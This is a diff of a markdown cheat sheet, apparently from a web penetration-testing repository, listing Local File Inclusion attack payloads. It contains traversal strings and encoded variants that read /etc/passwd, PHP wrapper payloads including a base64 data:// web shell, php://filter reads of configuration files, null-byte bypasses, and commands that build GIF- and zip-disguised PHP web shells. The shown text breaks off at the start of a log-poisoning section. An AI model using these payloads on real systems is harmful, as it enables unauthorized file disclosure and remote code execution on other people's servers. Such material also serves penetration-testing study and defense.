@@ -578,15 +578,7 @@ https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapp
 https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
 
 ## Local File Inclusion - LFI
-### Types
-#### Common
-```
-/etc/passwd  
-../../../../etc/passwd
-```
-
-#### Replace ../
-
+### Replace ../ - Bypass
 $language = str_replace('../', '', $_GET['file']);  
 ```
 /....//....//....//....//etc/passwd  
@@ -594,18 +586,16 @@ $language = str_replace('../', '', $_GET['file']);
 ....\/....\/....\/....\/etc/passwd 
 ```
 
-#### Block . and /
+### Block . and / - Bypass
 
--> urlencode and Double urlencode
-
--> /etc/passwd  
+-> urlencode and Double urlencode /etc/passwd  
 ```
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
 ```
 ```
 %25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
 ```  
-#### PHP Wrappers
+### PHP Wrappers
 
 ```
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id  
@@ -614,23 +604,21 @@ php://filter/read=convert.base64-encode/resource=index.php
 php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
 ```
 
-#### Filter PHP
+### Filter PHP
 -> Predefined Paths  
 preg_match('/^\.\/okay\/.+$/', $_GET['file'])  
 
 `./okay/../../../../etc/passwd`  
 
-#### Extension PHP Bypass - Null Bytes
+### PHP Extension Bypass with Null Bytes
 `https://site.com/index.php?file=/etc/passwd%00.php`  
 -> Removing .php  
 `https://site.com/index.php?file=index.p.phphp`  
   
 #### LFI + File Upload
-
 -> gif  
 `echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif`  
 https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
-
 -> Zip  
 1-  
 `echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php`  
@@ -639,7 +627,6 @@ https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/code
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg  
 
 #### Log Poisoning
- 
 -> apache
 ```
 nc ip 80  
